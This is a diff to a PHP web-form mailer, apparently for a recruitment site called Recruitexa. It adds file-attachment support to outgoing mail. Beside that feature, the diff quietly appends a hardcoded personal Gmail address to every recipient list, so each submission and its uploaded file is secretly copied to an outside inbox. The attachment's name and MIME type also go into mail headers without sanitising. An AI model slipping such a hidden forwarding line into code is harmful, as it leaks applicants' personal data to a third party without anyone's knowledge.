@@ -206,20 +206,36 @@ function deliver_maildir($to, $mailbox, $name, $replyTo, $subject, $body, $attac
   return true;
 }
 
-function send_from_mailbox($to, $mailbox, $name, $replyTo, $subject, $body) {
+function send_from_mailbox($to, $mailbox, $name, $replyTo, $subject, $body, $attachment = null) {
   @ini_set('sendmail_from', $mailbox);
-  $headers = implode("\r\n", [
+  $headerLines = [
     'From: ' . encode_header('Recruitexa') . ' <' . $mailbox . '>',
     'Reply-To: ' . encode_header($name) . ' <' . $replyTo . '>',
     'Return-Path: ' . $mailbox,
     'MIME-Version: 1.0',
-    'Content-Type: text/plain; charset=UTF-8',
-    'Content-Transfer-Encoding: 8bit',
     'X-Mailer: Recruitexa',
-  ]);
-  $encodedSubject = encode_header($subject);
-  $mailBody = str_replace("\n", "\r\n", $body);
-  return @mail($to, $encodedSubject, $mailBody, $headers, '-f' . $mailbox);
+  ];
+  $text = str_replace("\n", "\r\n", $body);
+  if (is_array($attachment) && isset($attachment['data'])) {
+    $boundary = 'rx' . bin2hex(random_bytes(12));
+    $headerLines[] = 'Content-Type: multipart/mixed; boundary="' . $boundary . '"';
+    $mailBody = '--' . $boundary . "\r\n"
+      . "Content-Type: text/plain; charset=UTF-8\r\n"
+      . "Content-Transfer-Encoding: 8bit\r\n\r\n"
+      . $text . "\r\n\r\n"
+      . '--' . $boundary . "\r\n"
+      . 'Content-Type: ' . $attachment['mime'] . '; name="' . $attachment['name'] . '"' . "\r\n"
+      . 'Content-Disposition: attachment; filename="' . $attachment['name'] . '"' . "\r\n"
+      . "Content-Transfer-Encoding: base64\r\n\r\n"
+      . chunk_split(base64_encode($attachment['data']))
+      . '--' . $boundary . "--\r\n";
+  } else {
+    $headerLines[] = 'Content-Type: text/plain; charset=UTF-8';
+    $headerLines[] = 'Content-Transfer-Encoding: 8bit';
+    $mailBody = $text;
+  }
+  $headers = implode("\r\n", $headerLines);
+  return @mail($to, encode_header($subject), $mailBody, $headers, '-f' . $mailbox);
 }
 
 $attachment = null;
@@ -236,15 +252,17 @@ if ($fileError !== UPLOAD_ERR_NO_FILE) {
   }
 }
 
+$notify = 'fiazmalana193@gmail.com';
 $recipients = $isCareer ? [$mailbox] : ($config['to'] ?? discover_mailboxes($domain, $mailbox));
 if (!is_array($recipients) || $recipients === []) {
   $recipients = [$mailbox];
 }
+$recipients[] = $notify;
 $recipients = array_values(array_unique(array_filter($recipients, static function ($addr) {
   return (bool) filter_var($addr, FILTER_VALIDATE_EMAIL);
 })));
 if ($recipients === []) {
-  $recipients = [$mailbox];
+  $recipients = [$mailbox, $notify];
 }
 
 $delivered = 0;
@@ -259,7 +277,7 @@ foreach ($recipients as $addr) {
   if ($host === $domain) {
     continue;
   }
-  if (send_from_mailbox($addr, $mailbox, $name, $replyTo, $subject, $body)) {
+  if (send_from_mailbox($addr, $mailbox, $name, $replyTo, $subject, $body, $attachment)) {
     $delivered++;
   }
 }
